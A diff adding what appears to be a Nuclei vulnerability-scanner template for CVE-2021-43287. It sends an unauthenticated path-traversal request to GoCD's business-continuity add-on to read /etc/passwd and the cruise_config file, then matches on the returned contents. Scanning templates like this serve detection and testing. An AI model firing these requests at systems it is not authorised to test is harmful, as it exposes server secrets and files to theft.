@@ -1,0 +1,42 @@
+id: gocd-arbitrary-file-read
+info:
+  name: GoCD Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    GoCD is a free and open source CI/CD server. The lack of authentication in the
+    GoCD/add-on/ path causes an attacker to read any file, including sensitive information
+    such as the cruise_config server configuration file and the cipher.aes private key.
+  classification:
+    cve-id:
+      - CVE-2021-43287
+  reference:
+    - https://censys.io/blog/gocd-unauthenticated-takeover/
+    - https://www.gocd.org
+  tags: file-read
+
+variables:
+  filepath: "plugin?folderName=a&pluginName=/../../../../../../../../etc/passwd"
+
+http:
+  - raw:
+      - |
+        GET /go/add-on/business-continuity/api/{{filepath}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: or
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*?:0:0:"
+        part: body
+  - raw:
+      - |
+        GET /go/add-on/business-continuity/api/cruise_config HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "property"
+          - "agentAutoRegisterKey"
+        part: body
